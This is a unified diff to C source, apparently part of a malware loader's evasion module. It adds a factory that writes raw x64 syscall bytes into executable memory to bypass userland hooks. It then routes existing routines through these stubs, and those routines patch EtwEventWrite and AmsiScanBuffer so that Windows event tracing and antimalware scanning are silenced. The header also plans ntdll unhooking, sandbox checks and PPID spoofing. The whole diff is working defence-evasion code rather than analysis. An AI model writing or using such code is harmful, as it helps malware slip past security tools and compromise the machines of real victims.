@@ -7,6 +7,7 @@
  * Solution:
  * 1. Unhook ntdll.dll by reading the original from disk and restoring hooked bytes
  * 2. Use direct syscalls for critical operations (NtProtectVirtualMemory, etc.)
+ *    Syscall stubs are created by allocating executable memory and writing raw bytes.
  * 3. Anti-sandbox: sleep + check for mouse movement before doing anything suspicious
  * 4. PPID spoofing: make process appear launched by explorer.exe
  */
@@ -18,61 +19,72 @@
 #include <string.h>
 #include "obf.h"
 
-/* === Direct Syscall Stubs ===
- * These invoke kernel functions directly via syscall instruction,
- * bypassing any userland hooks in ntdll.dll.
+/* === Syscall Stub Factory ===
+ * MSVC x64 doesn't support __declspec(naked) or inline __asm.
+ * We allocate executable memory and write raw x64 syscall bytes.
  * 
- * Syscall numbers are for Windows 10/11 x64 (may need updating for different versions).
- * Current numbers are for Win10 20H2+ / Win11.
+ * x64 syscall stub bytes:
+ *   4C 8B D1          mov r10, rcx
+ *   B8 XX XX XX XX    mov eax, SYSCALL_NUM
+ *   0F 05             syscall
+ *   C3                ret
  */
 
-/* NtProtectVirtualMemory — syscall for VirtualProtect */
-__declspec(naked) NTSTATUS NtProtectVirtualMemory_syscall(
-    HANDLE ProcessHandle,
-    PVOID *BaseAddress,
-    SIZE_T *NumberOfBytesToProtect,
-    ULONG NewAccessProtection,
-    PULONG OldAccessProtection
-) {
-    __asm {
-        mov r10, rcx
-        mov eax, 0x50  /* syscall number for NtProtectVirtualMemory on Win10/11 x64 */
-        syscall
-        ret
-    }
+typedef NTSTATUS (WINAPI *syscall_stub_t)(...);
+
+static syscall_stub_t create_syscall_stub(DWORD syscall_num) {
+    unsigned char stub[] = {
+        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
+        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, syscall_num */
+        0x0F, 0x05,                   /* syscall */
+        0xC3                          /* ret */
+    };
+    /* Patch syscall number */
+    memcpy(stub + 4, &syscall_num, 4);
+    
+    void *mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) return NULL;
+    memcpy(mem, stub, sizeof(stub));
+    return (syscall_stub_t)mem;
 }
 
-/* NtAllocateVirtualMemory — syscall for VirtualAlloc */
-__declspec(naked) NTSTATUS NtAllocateVirtualMemory_syscall(
-    HANDLE ProcessHandle,
-    PVOID *BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect
-) {
-    __asm {
-        mov r10, rcx
-        mov eax, 0x18  /* syscall number for NtAllocateVirtualMemory on Win10/11 x64 */
-        syscall
-        ret
-    }
+/* Syscall numbers for Windows 10/11 x64 (Win10 20H2+ / Win11) */
+#define SYSCALL_NtProtectVirtualMemory  0x50
+#define SYSCALL_NtAllocateVirtualMemory 0x18
+#define SYSCALL_NtWriteVirtualMemory    0x3A
+
+static syscall_stub_t g_scProtect = NULL;
+static syscall_stub_t g_scAllocate = NULL;
+static syscall_stub_t g_scWrite = NULL;
+
+static void init_syscalls(void) {
+    if (!g_scProtect)  g_scProtect  = create_syscall_stub(SYSCALL_NtProtectVirtualMemory);
+    if (!g_scAllocate) g_scAllocate = create_syscall_stub(SYSCALL_NtAllocateVirtualMemory);
+    if (!g_scWrite)    g_scWrite    = create_syscall_stub(SYSCALL_NtWriteVirtualMemory);
 }
 
-/* NtWriteVirtualMemory — syscall for WriteProcessMemory */
-__declspec(naked) NTSTATUS NtWriteVirtualMemory_syscall(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T NumberOfBytesToWrite,
-    PSIZE_T NumberOfBytesWritten
-) {
-    __asm {
-        mov r10, rcx
-        mov eax, 0x3A  /* syscall number for NtWriteVirtualMemory on Win10/11 x64 */
-        syscall
-        ret
-    }
+/* Wrapper: NtProtectVirtualMemory via direct syscall */
+static NTSTATUS sc_protect_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
+    SIZE_T *NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
+    if (!g_scProtect) init_syscalls();
+    if (!g_scProtect) return -1;
+    return g_scProtect(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
+}
+
+/* Wrapper: NtAllocateVirtualMemory via direct syscall */
+static NTSTATUS sc_allocate_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
+    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
+    if (!g_scAllocate) init_syscalls();
+    if (!g_scAllocate) return -1;
+    return g_scAllocate(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+}
+
+/* Wrapper: NtWriteVirtualMemory via direct syscall */
+static NTSTATUS sc_write_memory(HANDLE ProcessHandle, PVOID BaseAddress,
+    PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
+    if (!g_scWrite) init_syscalls();
+    if (!g_scWrite) return -1;
+    return g_scWrite(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
 }
 
 /* === Ntdll Unhooking ===
@@ -199,7 +211,7 @@ void obf_bypass_etw_syscall(void) {
     SIZE_T size = 1;
     ULONG oldProtect = 0;
     
-    NTSTATUS status = NtProtectVirtualMemory_syscall(
+    NTSTATUS status = sc_protect_memory(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -212,7 +224,7 @@ void obf_bypass_etw_syscall(void) {
     *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
     
     /* Restore protection */
-    NtProtectVirtualMemory_syscall(
+    sc_protect_memory(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -234,7 +246,7 @@ void obf_bypass_amsi_syscall(void) {
     SIZE_T size = 3;
     ULONG oldProtect = 0;
     
-    NTSTATUS status = NtProtectVirtualMemory_syscall(
+    NTSTATUS status = sc_protect_memory(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -247,7 +259,7 @@ void obf_bypass_amsi_syscall(void) {
     unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
     memcpy(pAmsiScanBuffer, patch, 3);
     
-    NtProtectVirtualMemory_syscall(
+    sc_protect_memory(
         GetCurrentProcess(),
         &addr,
         &size,
